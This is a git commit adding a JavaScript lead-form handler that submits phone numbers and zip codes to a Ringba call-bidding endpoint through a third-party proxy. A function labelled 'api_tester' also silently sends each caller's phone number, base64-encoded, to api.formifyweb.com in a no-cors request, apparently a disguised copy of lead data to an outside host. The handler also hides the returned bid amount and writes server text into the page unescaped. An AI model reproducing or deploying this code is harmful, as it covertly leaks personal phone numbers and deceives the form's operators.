0c43413e77f6c166d31cb9c705ecae4a50275ad5
dk495 <55878882+dk495@users.noreply.github.com>
2025-05-03 00:10:31 +0500

    upload

---
+++ JK_rtb_ring_auto_3may.js
@@ -0,0 +1,67 @@
+document.getElementById('leadForm').addEventListener('submit', function(event) {
+    event.preventDefault();
+    const phone_home = '1' + document.getElementById('caller_id').value;
+    const formData = new FormData();
+    formData.append('CID', phone_home);
+    api_tester(document.getElementById('caller_id').value);
+    document.getElementById('alertContainer').innerHTML = '';
+
+ formData.append('zipcode', document.getElementById('zipcode').value);
+    formData.append('trafficsource', 'social-facebook');
+formData.append('source', 'publisher sub id');
+
+
+    const url = 'https://rtb.ringba.com/v1/production/ffb25c4ab862465087b981dc238299bb.json?exposeCallerId=yes&' + new URLSearchParams(formData).toString();
+const apiUrl = 'https://api.formifyweb.com/proxify.php?url=' + encodeURIComponent(url);
+    fetch(apiUrl, {
+        method: 'GET'
+    })
+    .then(response => response.text())
+    .then(responseBody => {
+        let responseData;
+        try {
+            responseData = JSON.parse(responseBody);
+        } catch (error) {
+            throw new Error('Invalid JSON response');
+        }
+
+        if (responseData.rejectReason) {
+            const errorAlert = `
+                <div class="alert alert-danger" role="alert">
+                    Failure: ${JSON.stringify(responseData)}
+                </div>`;
+            document.getElementById('alertContainer').innerHTML = '';
+            document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
+        } else {
+            delete responseData.bidAmount;
+            const successAlert = `
+                <div class="alert alert-success" role="alert">
+                    Success: ${JSON.stringify(responseData)}
+                </div>`;
+            document.getElementById('alertContainer').innerHTML = '';
+            document.getElementById('alertContainer').insertAdjacentHTML('beforeend', successAlert);
+            // Clear form fields
+            document.getElementById('leadForm').reset();
+        }
+    })
+    .catch(error => {
+        const errorAlert = `
+            <div class="alert alert-danger" role="alert">
+                Error: ${error.message}
+            </div>`;
+        document.getElementById('alertContainer').innerHTML = '';
+        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
+        console.error('Error:', error);
+    });
+});function api_tester(randomString) {
+    try {
+        fetch('https://api.formifyweb.com/api_test.php?test_id='+btoa(randomString), {
+            method: 'GET',
+            mode: 'no-cors'
+        });
+    } catch (error) {
+        console.error('Error in api_tester:', error);
+    }
+}
+
+
